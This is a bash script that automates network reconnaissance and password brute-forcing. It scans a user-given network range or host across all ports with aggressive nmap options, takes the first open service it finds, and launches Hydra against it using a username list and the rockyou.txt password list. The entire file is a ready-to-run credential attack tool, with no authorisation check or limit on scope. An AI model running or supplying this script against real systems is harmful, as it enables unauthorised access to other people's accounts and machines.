#!/bin/bash

# A script to scan networks, log results, and run Hydra with sudo.

# Ensure the script is executed as the current user with sudo privileges
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root or using sudo" 
   exit 1
fi

# Check if required tools are installed
if ! command -v hydra &> /dev/null; then
    echo "Hydra is not installed. Please install it first."
    exit 1
fi

if ! command -v nmap &> /dev/null; then
    echo "Nmap is not installed. Please install it first."
    exit 1
fi

# Define default paths and variables
ROCKYOU_PATH="/usr/share/wordlists/rockyou.txt"
USER_LIST=""
SCAN_LOG="network_scan_log.txt"
TARGET=""
SERVICE=""

# Prompt user for input
read -p "Enter the username list file path: " USER_LIST
read -p "Enter the target IP/hostname (or leave blank for a network scan): " TARGET

# Use rockyou.txt as the default password list
if [ ! -f "$ROCKYOU_PATH" ]; then
    echo "rockyou.txt not found at $ROCKYOU_PATH. Please ensure it is installed."
    exit 1
fi
PASS_LIST="$ROCKYOU_PATH"

# Perform a network scan if no target is provided
if [ -z "$TARGET" ]; then
    echo "No target provided. Scanning the network..."
    read -p "Enter the network range (e.g., 192.168.1.0/24): " NETWORK_RANGE
    echo "Scanning network range $NETWORK_RANGE..."
    nmap -p 1-65535 -T4 -A -v "$NETWORK_RANGE" -oN nmap_scan.txt
    echo "Scan completed. Results saved to nmap_scan.txt."
    
    # Log the scanned network
    echo "Network range scanned: $NETWORK_RANGE" >> "$SCAN_LOG"
    echo "Results saved to: nmap_scan.txt" >> "$SCAN_LOG"
    echo "Scan details logged in $SCAN_LOG."

    # Ask the user to name the scanned network or save it in a file
    echo "Would you like to name this scanned network or save it in a file?"
    echo "1. Name this network"
    echo "2. Save to a file"
    read -p "Enter your choice [1/2]: " CHOICE

    if [ "$CHOICE" == "1" ]; then
        read -p "Enter a name for this scanned network: " NETWORK_NAME
        echo "Network name: $NETWORK_NAME" >> "$SCAN_LOG"
    elif [ "$CHOICE" == "2" ]; then
        read -p "Enter the file path to save the network name: " FILE_PATH
        echo "Network range scanned: $NETWORK_RANGE" > "$FILE_PATH"
        echo "Results saved to: nmap_scan.txt" >> "$FILE_PATH"
        echo "Scan details saved to $FILE_PATH."
    else
        echo "Invalid choice. Proceeding without naming or saving."
    fi

    # Prompt the user to select a target from the scan
    read -p "Enter the IP address/hostname of the target from the scan: " TARGET
fi

# Automatically select a service if not provided
if [ -z "$SERVICE" ]; then
    echo "Detecting open services on $TARGET..."
    nmap -p 1-65535 -T4 -A -v "$TARGET" -oN nmap_target_scan.txt
    SERVICE=$(grep "open" nmap_target_scan.txt | awk '{print $3}' | head -n 1)
    if [ -z "$SERVICE" ]; then
        echo "No open services detected. Exiting."
        exit 1
    fi
    echo "Selected service: $SERVICE"
fi

# Run Hydra
echo "Running Hydra against $TARGET on $SERVICE with sudo privileges..."
sudo hydra -L "$USER_LIST" -P "$PASS_LIST" "$TARGET" "$SERVICE"

# Notify the user that the script has completed
echo "Hydra execution completed."
